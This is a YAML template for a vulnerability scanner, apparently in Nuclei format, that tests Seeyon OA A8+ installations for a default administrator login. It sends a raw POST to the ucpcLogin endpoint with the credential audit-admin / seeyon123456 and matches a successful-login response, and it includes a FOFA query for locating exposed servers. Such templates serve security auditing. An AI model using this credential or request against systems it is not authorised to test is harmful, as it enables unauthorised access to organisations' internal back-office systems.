http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"LoginOK":"ok"'
    - audit-admin
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - seeyon123456
    username:
    - audit-admin
  raw:
  - 'POST /seeyon/rest/authentication/ucpcLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    UserAgentFrom=iphone&login_username={{username}}&login_password={{password}}

    '
id: seeyon-a8-default-login
info:
  author: SleepingBag945
  description: 'Seeyon (seeyon) OA A8+ Enterprise Edition has a weak password vulnerability,
    which can be used to log in to the background

    '
  metadata:
    fofa-query: "app=\"\u81F4\u8FDC\u4E92\u8054-OA\""
    max-request: 1
    verified: true
  name: Seeyon OA A8 - Default Login
  severity: high
  tags: seeyon,oa,default-login
